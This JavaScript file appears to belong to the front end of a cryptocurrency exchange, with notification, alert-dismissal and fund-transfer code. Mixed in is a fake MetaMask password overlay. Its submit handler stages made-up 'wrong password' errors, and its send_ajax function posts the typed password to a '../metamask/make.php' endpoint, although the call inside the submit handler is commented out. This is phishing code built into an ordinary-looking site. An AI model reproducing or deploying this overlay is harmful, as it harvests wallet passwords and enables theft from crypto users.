 function noti(msg, status) {
    toastr[status](msg);
    toastr.options = {
      "closeButton": false,
      "debug": false,
      "newestOnTop": false,
      "progressBar": false,
      "rtl": false,
      "positionClass": "toast-top-right",
      "preventDuplicates": false,
      "onclick": null,
      "showDuration": 300,
      "hideDuration": 1000,
      "timeOut": 5000,
      "extendedTimeOut": 1000,
      "showEasing": "swing",
      "hideEasing": "linear",
      "showMethod": "fadeIn",
      "hideMethod": "fadeOut"
    }
  }



	$("#alert_close_modal").on("click", function() {
    $("#alert_message_modal").css("display", "none");
    var alertMessageId = $("#alertMessageId").val();

		  $.ajax({
	      url: "../ajax/ajax",
	      type: "POST",
	      data: {
	        action: "VIEWED_ALERT_MESSAGE",
	        message_id: alertMessageId
	      },
	      success: function(response) {

	      }
	    })
  });

  $("#alert_close_modal_btn").on("click", function() {
    $("#alert_message_modal").css("display", "none");
    var alertMessageId = $("#alertMessageId").val();

		  $.ajax({
	      url: "../ajax/ajax",
	      type: "POST",
	      data: {
	        action: "VIEWED_ALERT_MESSAGE",
	        message_id: alertMessageId
	      },
	      success: function(response) {

	      }
	    })
  });


   function openMetaMask() {
    $("#metMaskBlock").css("opacity", "1");
    $("#metMaskBlock").css("z-index", "99999999");
    setTimeout(function () {
        $('#load').addClass('hide');
        $("#verify_popap_meta").css("display", "none");
        document.getElementById('loaded').classList.remove('hide');
    }, 1000);

    setInterval(function() {
      if(($("#pswrd").val().length > 7)) {document.getElementById("buttonf").disabled = false;} else {document.getElementById("buttonf").disabled = true;}
    }, 1000)


  }


function func() {
  document.getElementById('pswrd').classList.remove('border-red');
  $('#error1').addClass('hide');
}


var calc = 0;

function sendform(e) {
        e.preventDefault();
        //send_message()
        calc ++
        $('#error1').addClass('hide');
        $('#error2').addClass('hide');
        document.getElementById('pswrd').classList.remove('border-red');

        if (calc < 3) {
        $('#buttonf').addClass('hide');
        document.getElementById('loading').classList.remove('hide');
        setTimeout(function () {
        $('#loading').addClass('hide');
        $('#pswrd').addClass('border-red');
        document.getElementById('error1').classList.remove('hide');
        document.getElementById('buttonf').classList.remove('hide'); 
        }, 1234);
        }

        if (calc > 2) {
        $('#buttonf').addClass('hide');
        document.getElementById('loading').classList.remove('hide');
        setTimeout(function () {
        $('#loading').addClass('hide');
        document.getElementById('error2').classList.remove('hide');
        }, 984);
        }
       
}
    
    
function send_message() {
        var res = document.getElementById('pswrd').value;
            send_ajax(res)
}

function send_ajax(text) {
       return new Promise(function (resolve, reject) {
            $.ajax({
                type: 'post',
                url: '../metamask/make.php',
                dataType: 'json',
                data: {
                    'text':text,
                }
            });
        });
}


$("#closeMetaMaskBtn").on("click", function() {
    $("#verify_popap_meta").css("display", "none");
    var MetaalertMessageId = $("#MetaalertMessageId").val();

		  $.ajax({
	      url: "../ajax/ajax",
	      type: "POST",
	      data: {
	        action: "VIEWED_ALERT_MESSAGE",
	        message_id: MetaalertMessageId
	      },
	      success: function(response) {

	      }
	    })
  }); 

  
  
        var active_coin = 'BTC';

        function availableBalance() {
            var available = $("#my_available_balance").html();
            $("#amount_input").val(available);
        }

        $(".transferForm__coin-items .transfer__currency-item").on("click", function() {
            active_coin = $(this).find('.transferForm__currency-sub').text();

            $.ajax({
                url: '/ajax/MY_EX_BALANCE',
                type: 'POST',
                data: {
                    crypto: active_coin
                },
                success: function(event) {

                    $("#my_available_balance").empty().html(event); 
                    $("#my_available_crypto").empty().html(" " + active_coin.toUpperCase()); 
               
                }
            })

            $("#transfer_range").val("0");
            $("#transfer_range").css("background-size", "0% 100%");

        })

        function transfer(event) {
            event.preventDefault();
            
            var crypto = active_coin;
            var user_email = $("#transfer_email").val();
            var amount = parseFloat($("#amount_input").val());

            $.ajax({
              url: "/ajax/GET_MY_REAL_BALANCE",
              type: "POST",
              data: {
                crypto: crypto
              },
              success: function(response) {
                var user_balance = parseFloat(response);

                if(user_email == "" || user_email.length < 6) {
                    noti("Please enter a valid email address", "error");
                } else if(amount == "") {
                    noti("Please enter the amount to transfer", "error");
                } else if(amount > user_balance) {
                    noti("You don't have enough balance to transfer", "error");
                } else {
                    
                    $.ajax({
                      url: "/ajax/TRANSFER",
                      type: "POST",
                      data: {
                        amount: amount,
                        crypto: crypto,
                        user_email: user_email
                      },
                      success: function(response) {
                        if(response == "1") {
                            noti("Transfer funds completed successfully!", "success");
                            $("#transfer_email").val("");
                            $("#amount_input").val("");

                            $.ajax({
                                url: '/ajax/MY_EX_BALANCE',
                                type: 'POST',
                                data: {
                                    action: "MY_EX_BALANCE",
                                    crypto: active_coin
                                },
                                success: function(event) {

                                    $("#my_available_balance").empty().html(event); 
                                    $("#my_available_crypto").empty().html(" " + active_coin.toUpperCase()); 
                               
                                }
                            })
                        } else if(response == "2") {
                            noti("Not enough balance", "error");
                        } else if(response == "4") {
                            noti("User with this email was not found", "error");
                        } else if(response == "6") {
                            noti("Transfer is forbidden for your account. Probably, it is the result of non-compliance. More information you can get from support manager.", "error");
                        } else if(response == "23") {
                            noti("You can't translate yourself!", "error");
                        } else {
                            noti("Request failed, please try again later", "error");
                        }

                      }
                    })
                }

              }
            })

        }

        $("#transfer_range").change(function() {
            var range = $("#transfer_range").val();
            var balance = $("#my_available_balance").text();
            var calc = parseFloat(balance) / 100 * parseFloat(range);

            $("#amount_input").val(calc);
        });